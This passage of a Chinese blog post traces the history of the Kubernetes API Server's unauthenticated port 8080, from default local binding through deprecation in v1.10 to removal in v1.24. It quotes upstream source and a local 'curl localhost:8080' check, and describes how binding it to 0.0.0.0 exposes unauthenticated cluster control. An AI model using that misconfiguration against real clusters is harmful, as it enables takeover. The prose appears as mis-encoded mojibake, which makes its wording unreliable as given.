æœ‰å†™æƒé™çš„äººéƒ½å¯ä»¥ä»¥ç›¸åŒçš„æ–¹å¼å¯¹é›†ç¾¤è¿›è¡Œç®¡æ§ã€‚</p><p><img src="/image/image_Uo8yOw_xpp.png" alt="å›¾ 1ï¼šAPI Server ä¸ kubectl çš„å…³ç³»ï¼ˆç®€åŒ–ç‰ˆï¼‰"></p><p>å›¾ 1ï¼šAPI Server ä¸ kubectl çš„å…³ç³»ï¼ˆç®€åŒ–ç‰ˆï¼‰</p><p>å¦‚å›¾æ‰€ç¤ºï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ kubectl è·å–é›†ç¾¤ä¿¡æ¯çš„æ—¶å€™ï¼Œåªè¦é€šè¿‡ <code>-v 8</code> å°†æ—¥å¿—çš„ç­‰çº§è°ƒåˆ° 8ï¼Œå°±å¯ä»¥çœ‹åˆ°å®Œæ•´çš„ HTTP(S) æ•°æ®åŒ…ã€‚</p><p><img src="/image/image_6YDIbyDLuM.png" alt="å›¾ 2ï¼škubectl ä¸ API Server çš„äº¤äº’æœ¬è´¨ä¸Šåªæ˜¯å‘èµ· HTTP(S) è¯·æ±‚"></p><p>å›¾ 2ï¼škubectl ä¸ API Server çš„äº¤äº’æœ¬è´¨ä¸Šåªæ˜¯å‘èµ· HTTP(S) è¯·æ±‚</p><h2 id="0x02-æœ¬åœ°è®¿é—®ä¸å®‰å…¨çš„æœåŠ¡"><a href="#0x02-æœ¬åœ°è®¿é—®ä¸å®‰å…¨çš„æœåŠ¡" class="headerlink" title="0x02 æœ¬åœ°è®¿é—®ä¸å®‰å…¨çš„æœåŠ¡"></a>0x02 æœ¬åœ°è®¿é—®ä¸å®‰å…¨çš„æœåŠ¡</h2><p>æ—©æœŸï¼ŒKubernetes é›†ç¾¤éœ€è¦å…è®¸è´Ÿè½½å‡è¡¡ç­‰ç»„ä»¶è¿›è¡Œå¥åº·æ£€æŸ¥å’Œå‘ç°ï¼Œæ‰€ä»¥é»˜è®¤æƒ…å†µä¸‹ï¼ŒAPI Server ä¼šåœ¨æœ¬åœ°ç›‘å¬ä¸å®‰å…¨çš„æœåŠ¡ã€‚</p><p>ä»¥ 2018 å¹´ 3 æœˆ 7 æ—¥å‘å¸ƒçš„ Kubernetes v1.9.0 ä¸ºä¾‹ï¼ŒKubernetes åœ¨åˆ›å»º API Server çš„æ—¶å€™ï¼Œä¼šåˆ›å»ºä¸å®‰å…¨çš„æœåŠ¡ <code>InsecureServing</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"> <span class="hljs-comment">// NewServerRunOptions creates a new ServerRunOptions object with default parameters</span><br> <span class="hljs-comment">// ä»£ç ç‰‡æ®µé“¾æ¥ï¼šhttps://github.com/kubernetes/kubernetes/blob/b5ec061c7ab9995a801206ea74f614ced04206d2/cmd/kube-apiserver/app/options/options.go#L76</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewServerRunOptions</span><span class="hljs-params">()</span></span> *ServerRunOptions &#123;<br>  s := ServerRunOptions&#123;<br>    GenericServerRunOptions: genericoptions.NewServerRunOptions(),<br>    Etcd:                 genericoptions.NewEtcdOptions(storagebackend.NewDefaultConfig(kubeoptions.DefaultEtcdPathPrefix, <span class="hljs-literal">nil</span>)),<br>    SecureServing:        kubeoptions.NewSecureServingOptions(),<br>    <span class="hljs-comment">// API Server ä¼šåˆ›å»ºä¸å®‰å…¨çš„æœåŠ¡</span><br>    InsecureServing:      kubeoptions.NewInsecureServingOptions(),<br>    Audit:                genericoptions.NewAuditOptions(),<br>    Features:             genericoptions.NewFeatureOptions(),<br>    Admission:            genericoptions.NewAdmissionOptions(),<br>    Authentication:       kubeoptions.NewBuiltInAuthenticationOptions().WithAll(),<br>    Authorization:        kubeoptions.NewBuiltInAuthorizationOptions(),<br>    CloudProvider:        kubeoptions.NewCloudProviderOptions(),<br>    StorageSerialization: kubeoptions.NewStorageSerializationOptions(),<br>    APIEnablement:        kubeoptions.NewAPIEnablementOptions(),<br><br>    EnableLogsHandler:      <span class="hljs-literal">true</span>,<br>    EventTTL:               <span class="hljs-number">1</span> * time.Hour,<br>    MasterCount:            <span class="hljs-number">1</span>,<br>    EndpointReconcilerType: <span class="hljs-type">string</span>(reconcilers.MasterCountReconcilerType),<br>    KubeletConfig: kubeletclient.KubeletClientConfig&#123;<br>      Port:         ports.KubeletPort,<br>      ReadOnlyPort: ports.KubeletReadOnlyPort,<br>      PreferredAddressTypes: []<span class="hljs-type">string</span>&#123;<br>        <span class="hljs-comment">// --override-hostname</span><br>        <span class="hljs-type">string</span>(api.NodeHostName),<br><br>        <span class="hljs-comment">// internal, preferring DNS if reported</span><br>        <span class="hljs-type">string</span>(api.NodeInternalDNS),<br>        <span class="hljs-type">string</span>(api.NodeInternalIP),<br><br>        <span class="hljs-comment">// external, preferring DNS if reported</span><br>        <span class="hljs-type">string</span>(api.NodeExternalDNS),<br>        <span class="hljs-type">string</span>(api.NodeExternalIP),<br>      &#125;,<br>      EnableHttps: <span class="hljs-literal">true</span>,<br>      HTTPTimeout: time.Duration(<span class="hljs-number">5</span>) * time.Second,<br>    &#125;,<br>    ServiceNodePortRange: kubeoptions.DefaultServiceNodePortRange,<br>  &#125;<br>  <span class="hljs-comment">// Overwrite the default for storage data format.</span><br>  s.Etcd.DefaultStorageMediaType = <span class="hljs-string">&quot;application/vnd.kubernetes.protobuf&quot;</span><br><br>  <span class="hljs-comment">// register all admission plugins</span><br>  RegisterAllAdmissionPlugins(s.Admission.Plugins)<br>  <span class="hljs-comment">// Set the default for admission plugins names</span><br>  s.Admission.PluginNames = []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;AlwaysAdmit&quot;</span>&#125;<br>  <span class="hljs-keyword">return</span> &amp;s<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªä¸å®‰å…¨çš„æœåŠ¡çš„ç«¯å£å°±æ˜¯ <code>8080</code>ï¼Œåªèƒ½åœ¨æœ¬åœ°è¿›è¡Œè®¿é—®ï¼Œä»»ä½•å¯¹è¯¥ç«¯å£çš„è¯·æ±‚éƒ½ä¼šè·³è¿‡èº«ä»½éªŒè¯å’Œæƒé™æ£€æŸ¥ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// NewInsecureServingOptions is for creating an unauthenticated, unauthorized, insecure port.</span><br><span class="hljs-comment">// No one should be using these anymore.</span><br><span class="hljs-comment">// ä»£ç ç‰‡æ®µé“¾æ¥ï¼šhttps://github.com/kubernetes/kubernetes/blob/b5ec061c7ab9995a801206ea74f614ced04206d2/pkg/kubeapiserver/options/serving.go#L75C1-L83C1</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewInsecureServingOptions</span><span class="hljs-params">()</span></span> *InsecureServingOptions &#123;<br>  <span class="hljs-keyword">return</span> &amp;InsecureServingOptions&#123;<br>    BindAddress: net.ParseIP(<span class="hljs-string">&quot;127.0.0.1&quot;</span>),<br>    <span class="hljs-comment">// ä¸å®‰å…¨æœåŠ¡çš„ç«¯å£ä¸º 8080</span><br>    BindPort:    <span class="hljs-number">8080</span>,<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ <code>curl</code> å‘½ä»¤è¿›è¡Œæ£€æŸ¥ï¼Œçœ‹çœ‹æœ¬åœ°æ˜¯å¦åœ¨ç›‘å¬ä¸å®‰å…¨çš„æœåŠ¡ã€‚è‹¥å‘½ä»¤æ‰§è¡Œè¿‡åï¼Œåˆ—å‡ºäº† API æ¥å£ï¼Œé‚£ä¹ˆä¸å®‰å…¨çš„æœåŠ¡æ˜¯æ‰“å¼€çš„çŠ¶æ€ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl localhost:8080<br></code></pre></td></tr></table></figure><p><img src="/image/image_lxR7Ti5MsU.png" alt="å›¾ 3ï¼šæœ¬åœ°åœ¨ç›‘å¬ä¸å®‰å…¨çš„æœåŠ¡"></p><p>å›¾ 3ï¼šæœ¬åœ°åœ¨ç›‘å¬ä¸å®‰å…¨çš„æœåŠ¡</p><p>è‹¥è¯¥æœåŠ¡èƒ½è¢«ä»»ä½•äººè¿›è¡Œè®¿é—®ï¼Œé‚£ä¹ˆä»»ä½•èƒ½å¤Ÿè®¿é—® master èŠ‚ç‚¹çš„äººéƒ½å¯ä»¥å¯¹é›†ç¾¤è¿›è¡Œç®¡æ§ï¼Œè¿™æ˜¯æå…¶ä¸å®‰å…¨çš„ã€‚æ‰€ä»¥é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªä¸å®‰å…¨çš„æœåŠ¡åªèƒ½åœ¨æœ¬åœ°è¿›è¡Œè®¿é—®ã€‚<br><img src="/image/image_Ssctx5vMMw.png" alt="å›¾ 4ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å®‰å…¨çš„æœåŠ¡åªèƒ½é€šè¿‡æœ¬åœ°è¿›è¡Œè®¿é—®"></p><p>å›¾ 4ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å®‰å…¨çš„æœåŠ¡åªèƒ½é€šè¿‡æœ¬åœ°è¿›è¡Œè®¿é—®</p><h2 id="0x03-è¿œç¨‹è®¿é—®ä¸å®‰å…¨çš„æœåŠ¡"><a href="#0x03-è¿œç¨‹è®¿é—®ä¸å®‰å…¨çš„æœåŠ¡" class="headerlink" title="0x03 è¿œç¨‹è®¿é—®ä¸å®‰å…¨çš„æœåŠ¡"></a>0x03 è¿œç¨‹è®¿é—®ä¸å®‰å…¨çš„æœåŠ¡</h2><p>å½“ç„¶ï¼Œè¿™ä¸ªä¸å®‰å…¨çš„æœåŠ¡ä¹Ÿå¯ä»¥é€šè¿‡é…ç½®è¿›è¡Œä¿®æ”¹ï¼Œè®©å®ƒå¯ä»¥è¢«è¿œç¨‹è®¿é—®åˆ°ã€‚å…·ä½“éœ€è¦ä¿®æ”¹çš„ Flag å°±æ˜¯ <code>--insecure-bind-address</code> å’Œ <code>--insecure-port</code>ã€‚</p><p><code>--insecure-port</code> ç”¨äºæä¾›æœªåŠ å¯†ã€æœªè®¤è¯è®¿é—®çš„æœåŠ¡ç«¯å£ã€‚ä¹‹æ‰€ä»¥ä¼šæœ‰è¿™ä¸ªè®¾è®¡ï¼Œæ˜¯å› ä¸º Kubernetes å‡è®¾äº†ç”¨æˆ·å·²ç»é…ç½®äº†é˜²ç«å¢™è§„åˆ™ï¼Œè¿™ä¸ªç«¯å£æ— æ³•ä»é›†ç¾¤å¤–éƒ¨è¿›è¡Œè®¿é—®ï¼Œå¹¶ä¸” nginx é»˜è®¤ä¼šå°†é›†ç¾¤å…¬å…±åœ°å€ä¸Šçš„ 443 ç«¯å£ä»£ç†åˆ°è¿™ä¸ªç«¯å£ã€‚</p><p><code>--insecure-bind-address</code> ä¸»è¦æ˜¯ä¸ <code>--insecure-port</code> ä¸€èµ·ä½¿ç”¨ï¼Œè‹¥è®¾ç½®ä¸º <code>0.0.0.0</code>ï¼Œåˆ™å…è®¸æ‰€æœ‰çš„ IPv4 æ¥å£è¿›è¡Œè®¿é—®ï¼›è‹¥è®¾ç½®ä¸º <code>::</code>ï¼Œåˆ™å…è®¸æ‰€æœ‰çš„ IPv6 æ¥å£è¿›è¡Œè®¿é—®ã€‚</p><p>å¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å°† <code>--insecure-bind-address</code> è®¾ç½®ä¸º <code>0.0.0.0</code>ï¼Œ<code>--insecure-port</code> è®¾ç½®ä¸º <code>8080</code> ï¼Œä»¥è¾¾åˆ°å¯è¿œç¨‹è®¿é—®ä¸å®‰å…¨çš„æœåŠ¡çš„ç›®çš„ã€‚</p><p><img src="/image/image_6_pQE0mcDy.png" alt="å›¾ 5ï¼š &#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;kube-apiserver.yaml é…ç½®æ–‡ä»¶"></p><p>å›¾ 5ï¼š &#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;kube-apiserver.yaml é…ç½®æ–‡ä»¶</p><p>é…ç½®ç”Ÿæ•ˆè¿‡åï¼Œåªè¦æˆ‘ä»¬è·å–åˆ°é›†ç¾¤çš„ IP åœ°å€ï¼Œå°±èƒ½å¤Ÿå¯¹é›†ç¾¤çš„ä¸å®‰å…¨æœåŠ¡è¿›è¡Œè¿œç¨‹è®¿é—®ä¸æ§åˆ¶ã€‚</p><p>ç”±æ­¤çœ‹æ¥ï¼Œ<code>--insecure-bind-address</code> å’Œ <code>--insecure-port</code> æ˜¯éå¸¸ä¸å®‰å…¨çš„ã€‚</p><p><img src="/image/image_ZhzsBJWOx0.png" alt="å›¾ 6ï¼šå¯¹é›†ç¾¤çš„ä¸å®‰å…¨æœåŠ¡è¿›è¡Œè¿œç¨‹è®¿é—®"></p><p>å›¾ 6ï¼šå¯¹é›†ç¾¤çš„ä¸å®‰å…¨æœåŠ¡è¿›è¡Œè¿œç¨‹è®¿é—®</p><p>æ‰€ä»¥ï¼Œåœ¨ 2018 å¹´ 3 æœˆ 27 æ—¥å‘å¸ƒçš„ v1.10.0 ç‰ˆæœ¬ä¸­ï¼ŒKubernetes å°† <code>--insecure-bind-address</code> å’Œ <code>--insecure-port</code> è¿™ä¸¤ä¸ª Flag æ ‡è®°ä¸ºå¼ƒç”¨çš„çŠ¶æ€ï¼Œå¹¶å®£ç§°åœ¨æœªæ¥çš„ç‰ˆæœ¬ä¸­å°†å®Œå…¨ç§»é™¤ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// ä»£ç ç‰‡æ®µé“¾æ¥ï¼šhttps://github.com/kubernetes/kubernetes/blob/f170ef66340f6355d331ed90902574ff0532a20a/pkg/kubeapiserver/options/serving.go#L98</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *InsecureServingOptions)</span></span> AddFlags(fs *pflag.FlagSet) &#123;<br>  fs.IPVar(&amp;s.BindAddress, <span class="hljs-string">&quot;insecure-bind-address&quot;</span>, s.BindAddress, <span class="hljs-string">&quot;&quot;</span>+<br>    <span class="hljs-string">&quot;The IP address on which to serve the --insecure-port (set to 0.0.0.0 for all IPv4 interfaces and :: for all IPv6 interfaces).&quot;</span>)<br>  fs.MarkDeprecated(<span class="hljs-string">&quot;insecure-bind-address&quot;</span>, <span class="hljs-string">&quot;This flag will be removed in a future version.&quot;</span>)<br>  fs.Lookup(<span class="hljs-string">&quot;insecure-bind-address&quot;</span>).Hidden = <span class="hljs-literal">false</span><br><br>  fs.IntVar(&amp;s.BindPort, <span class="hljs-string">&quot;insecure-port&quot;</span>, s.BindPort, <span class="hljs-string">&quot;&quot;</span>+<br>    <span class="hljs-string">&quot;The port on which to serve unsecured, unauthenticated access. It is assumed &quot;</span>+<br>    <span class="hljs-string">&quot;that firewall rules are set up such that this port is not reachable from outside of &quot;</span>+<br>    <span class="hljs-string">&quot;the cluster and that port 443 on the cluster&#x27;s public address is proxied to this &quot;</span>+<br>    <span class="hljs-string">&quot;port. This is performed by nginx in the default setup. Set to zero to disable.&quot;</span>)<br>  fs.MarkDeprecated(<span class="hljs-string">&quot;insecure-port&quot;</span>, <span class="hljs-string">&quot;This flag will be removed in a future version.&quot;</span>)<br>  fs.Lookup(<span class="hljs-string">&quot;insecure-port&quot;</span>).Hidden = <span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤åï¼Œ<code>--insecure-bind-address</code> å’Œ <code>--insecure-port</code> è¿™ä¸¤ä¸ª Flag è¿˜èƒ½è¿›è¡Œä½¿ç”¨ï¼Œä½†å®˜æ–¹å›¢é˜Ÿå»ºè®®ç”¨æˆ·åº”å°½æ—©å¼ƒç”¨ï¼Œå› ä¸ºä»–ä»¬è®¤ä¸ºä»»ä½•æœåŠ¡éƒ½åº”è¯¥å…ˆé€šè¿‡å®‰å…¨è®¤è¯ï¼Œæ‰èƒ½è¿›è¡Œä½¿ç”¨ã€‚</p><p>äºæ˜¯ï¼Œ <code>--insecure-bind-address</code> å’Œ <code>--insecure-port</code> å°±ç›¸å½“äºè¢«å®£åˆ¤äº†â€œæ­»ç¼“â€ã€‚</p><h2 id="0x04-ä¸å®‰å…¨çš„æœåŠ¡è¢«å…³é—­"><a href="#0x04-ä¸å®‰å…¨çš„æœåŠ¡è¢«å…³é—­" class="headerlink" title="0x04 ä¸å®‰å…¨çš„æœåŠ¡è¢«å…³é—­"></a>0x04 ä¸å®‰å…¨çš„æœåŠ¡è¢«å…³é—­</h2><p>æ—¶é—´æ¥åˆ° 2020 å¹´ 12 æœˆ 9 æ—¥ï¼ŒKubernetes å‘å¸ƒçš„ v1.20.0 ç‰ˆæœ¬åœ¨æ ¹æ®é»˜è®¤é…ç½®åˆ›å»º API Server æœåŠ¡çš„æ—¶å€™ï¼Œå°±åˆ é™¤äº†åˆ›å»ºä¸å®‰å…¨çš„æœåŠ¡çš„ä»£ç ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// NewServerRunOptions creates a new ServerRunOptions object with default parameters</span><br><span class="hljs-comment">// ä»£ç ç‰‡æ®µé“¾æ¥ï¼šhttps://github.com/kubernetes/kubernetes/blob/4a89df5617b8e1e26abb16150502d04e6c180533/cmd/kube-apiserver/app/options/options.go#L98</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewServerRunOptions</span><span class="hljs-params">()</span></span> *ServerRunOptions &#123;<br>  s := ServerRunOptions&#123;<br>    GenericServerRunOptions: genericoptions.NewServerRunOptions(),<br>    Etcd:                    genericoptions.NewEtcdOptions(storagebackend.NewDefaultConfig(kubeoptions.DefaultEtcdPathPrefix, <span class="hljs-literal">nil</span>)),<br>    SecureServing:           kubeoptions.NewSecureServingOptions(),<br>    <span class="hljs-comment">// åœ¨æ­¤å¤„ï¼Œåˆ é™¤äº†ä¸å®‰å…¨æœåŠ¡åˆ›å»ºçš„ä»£ç </span><br>    Audit:                   genericoptions.NewAuditOptions(),<br>    Features:                genericoptions.NewFeatureOptions(),<br>    Admission:               kubeoptions.NewAdmissionOptions(),<br>    Authentication:          kubeoptions.NewBuiltInAuthenticationOptions().WithAll(),<br>    Authorization:           kubeoptions.NewBuiltInAuthorizationOptions(),<br>    CloudProvider:           kubeoptions.NewCloudProviderOptions(),<br>    APIEnablement:           genericoptions.NewAPIEnablementOptions(),<br>    EgressSelector:          genericoptions.NewEgressSelectorOptions(),<br>    Metrics:                 metrics.NewOptions(),<br>    Logs:                    logs.NewOptions(),<br><br>    EnableLogsHandler:                 <span class="hljs-literal">true</span>,<br>    EventTTL:                          <span class="hljs-number">1</span> * time.Hour,<br>    MasterCount:                       <span class="hljs-number">1</span>,<br>    EndpointReconcilerType:            <span class="hljs-type">string</span>(reconcilers.LeaseEndpointReconcilerType),<br>    IdentityLeaseDurationSeconds:      <span class="hljs-number">3600</span>,<br>    IdentityLeaseRenewIntervalSeconds: <span class="hljs-number">10</span>,<br>    KubeletConfig: kubeletclient.KubeletClientConfig&#123;<br>      Port:         ports.KubeletPort,<br>      ReadOnlyPort: ports.KubeletReadOnlyPort,<br>      PreferredAddressTypes: []<span class="hljs-type">string</span>&#123;<br>        <span class="hljs-comment">// --override-hostname</span><br>        <span class="hljs-type">string</span>(api.NodeHostName),<br><br>        <span class="hljs-comment">// internal, preferring DNS if reported</span><br>        <span class="hljs-type">string</span>(api.NodeInternalDNS),<br>        <span class="hljs-type">string</span>(api.NodeInternalIP),<br><br>        <span class="hljs-comment">// external, preferring DNS if reported</span><br>        <span class="hljs-type">string</span>(api.NodeExternalDNS),<br>        <span class="hljs-type">string</span>(api.NodeExternalIP),<br>      &#125;,<br>      HTTPTimeout: time.Duration(<span class="hljs-number">5</span>) * time.Second,<br>    &#125;,<br>    ServiceNodePortRange: kubeoptions.DefaultServiceNodePortRange,<br>  &#125;<br><br>  <span class="hljs-comment">// Overwrite the default for storage data format.</span><br>  s.Etcd.DefaultStorageMediaType = <span class="hljs-string">&quot;application/vnd.kubernetes.protobuf&quot;</span><br><br>  <span class="hljs-keyword">return</span> &amp;s<br>&#125;<br></code></pre></td></tr></table></figure><p>å¹¶ä¸” <code>--insecure-port</code> åªèƒ½è®¾ç½®ä¸º <code>0</code>ï¼Œè¡¨ç¤ºå…³é—­ä¸å®‰å…¨çš„æœåŠ¡ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> delete this check after insecure flags removed in v1.24</span><br><span class="hljs-comment">// ä»£ç ç‰‡æ®µé“¾æ¥ï¼šhttps://github.com/kubernetes/kubernetes/blob/4a89df5617b8e1e26abb16150502d04e6c180533/cmd/kube-apiserver/app/server.go#L92</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">checkNonZeroInsecurePort</span><span class="hljs-params">(fs *pflag.FlagSet)</span></span> <span class="hljs-type">error</span> &#123;<br>  <span class="hljs-keyword">for</span> _, name := <span class="hljs-keyword">range</span> options.InsecurePortFlags &#123;<br>    val, err := fs.GetInt(name)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-keyword">return</span> err<br>    &#125;<br>    <span class="hljs-keyword">if</span> val != <span class="hljs-number">0</span> &#123;<br>      <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;invalid port value %d: only zero is allowed&quot;</span>, val)<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœå¼ºè¡Œå°† <code>--insecure-port</code> æ ‡å¿—è®¾ç½®ä¸ºé 0 ç«¯å£ï¼Œä¾‹å¦‚ 8080ï¼ŒAPI Server å°†ä¼šæŠ¥é”™æ— æ³•æä¾›æœåŠ¡ã€‚åªæœ‰å°† <code>--insecure-port</code> æ”¹å›ä¸º 0 åï¼ŒAPIserver æ¢å¤æ­£å¸¸ã€‚</p><p><img src="/image/apiserver-baocuo.png" alt="å›¾ 7ï¼šAPIServer æŠ¥é”™"></p><p>å›¾ 7ï¼šâ€“insecure-port è®¾ç½®ä¸ºé 0 ç«¯å£ï¼ŒAPIServer ä¼šæŠ¥é”™</p><p><img src="/image/apiserver-huifu.jpg" alt="å›¾ 8ï¼šAPIServer æ¢å¤"></p><p>å›¾ 8ï¼šâ€“insecure-port è®¾ç½®ä¸º 0 ç«¯å£åï¼ŒAPIServer æ¢å¤æ­£å¸¸ã€‚</p><p>é€šè¿‡é™åˆ¶ç«¯å£çš„é…ç½®ï¼ŒKubernetes æ— éœ€ä¿®æ”¹ <code>--insecure-bind-address</code> çš„ç›¸å…³ä»£ç ï¼Œå³å¯å…³é—­ä¸å®‰å…¨çš„æœåŠ¡ã€‚</p><p>æ‰€ä»¥ï¼ŒKubernetes è‡ª v1.20.0 ç‰ˆæœ¬ä¹‹åï¼Œ<code>--insecure-bind-address</code> å’Œ <code>--insecure-port</code> è¿™ä¸¤ä¸ª Flag å°†ä¸å†èµ·ä»»ä½•ä½œç”¨äº†ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> remove these insecure flags in v1.24</span><br><span class="hljs-comment">// ä»£ç ç‰‡æ®µé“¾æ¥ï¼šhttps://github.com/kubernetes/kubernetes/blob/4a89df5617b8e1e26abb16150502d04e6c180533/cmd/kube-apiserver/app/options/options.go#L146</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">addDummyInsecureFlags</span><span class="hljs-params">(fs *pflag.FlagSet)</span></span> &#123;<br>  <span class="hljs-keyword">var</span> (<br>    bindAddr = net.IPv4(<span class="hljs-number">127</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>    bindPort <span class="hljs-type">int</span><br>  )<br><br>  <span class="hljs-keyword">for</span> _, name := <span class="hljs-keyword">range</span> []<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;insecure-bind-address&quot;</span>, <span class="hljs-string">&quot;address&quot;</span>&#125; &#123;<br>    fs.IPVar(&amp;bindAddr, name, bindAddr, <span class="hljs-string">&quot;&quot;</span>+<br>      <span class="hljs-string">&quot;The IP address on which to serve the insecure port (set to 0.0.0.0 for all IPv4 interfaces and :: for all IPv6 interfaces).&quot;</span>)<br>    fs.MarkDeprecated(name, <span class="hljs-string">&quot;This flag has no effect now and will be removed in v1.24.&quot;</span>)<br>  &#125;<br><br>  <span class="hljs-keyword">for</span> _, name := <span class="hljs-keyword">range</span> InsecurePortFlags &#123;<br>    fs.IntVar(&amp;bindPort, name, bindPort, <span class="hljs-string">&quot;&quot;</span>+<br>      <span class="hljs-string">&quot;The port on which to serve unsecured, unauthenticated access.&quot;</span>)<br>    fs.MarkDeprecated(name, <span class="hljs-string">&quot;This flag has no effect now and will be removed in v1.24.&quot;</span>)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x05-ä¸å®‰å…¨çš„æœåŠ¡è¢«ç§»é™¤"><a href="#0x05-ä¸å®‰å…¨çš„æœåŠ¡è¢«ç§»é™¤" class="headerlink" title="0x05 ä¸å®‰å…¨çš„æœåŠ¡è¢«ç§»é™¤"></a>0x05 ä¸å®‰å…¨çš„æœåŠ¡è¢«ç§»é™¤</h2><p>2022 å¹´ 5 æœˆ 25 æ—¥ï¼ŒKubernetes å‘å¸ƒäº† v1.24.0 ç‰ˆæœ¬ï¼Œåœ¨è¿™æ¬¡çš„å‘å¸ƒä¿¡æ¯ä¸­ï¼ŒKubernetes ç»ˆäºå°† <code>--insecure-bind-address</code> å’Œ <code>--insecure-port</code> ä¸¤ä¸ª Flag 